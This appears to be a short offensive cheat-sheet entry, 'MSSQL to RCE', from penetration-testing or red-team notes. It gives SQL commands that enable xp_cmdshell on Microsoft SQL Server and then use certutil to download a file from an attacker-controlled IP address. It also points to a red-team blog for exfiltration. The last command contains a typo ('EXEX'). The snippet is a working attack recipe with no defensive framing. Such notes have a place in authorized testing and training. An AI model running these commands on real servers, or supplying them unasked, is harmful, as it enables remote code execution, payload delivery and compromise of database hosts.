
### MSSQL to RCE 

````
## Refer  https://www.tarlogic.com/en/blog/red-team-tales-0x01/ for exfil 
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEX xp_cmdshell 'certutil -f -urlcache http://192.168.119.155/x x'; 
````
